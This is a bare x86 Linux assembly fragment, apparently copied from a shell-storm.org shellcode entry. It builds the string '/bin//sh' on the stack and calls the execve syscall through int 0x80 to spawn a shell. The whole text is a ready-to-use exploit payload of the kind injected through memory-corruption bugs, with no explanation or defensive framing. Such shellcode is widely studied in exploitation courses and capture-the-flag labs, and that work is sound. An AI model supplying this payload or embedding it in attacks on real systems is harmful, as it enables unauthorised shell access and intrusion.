section .text
    ; http://shell-storm.org/shellcode/files/shellcode-752.php
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f   ;; hs//
    push 0x6e69622f   ;; nib/
    mov ebx, esp
    mov al, 11
    int 0x80
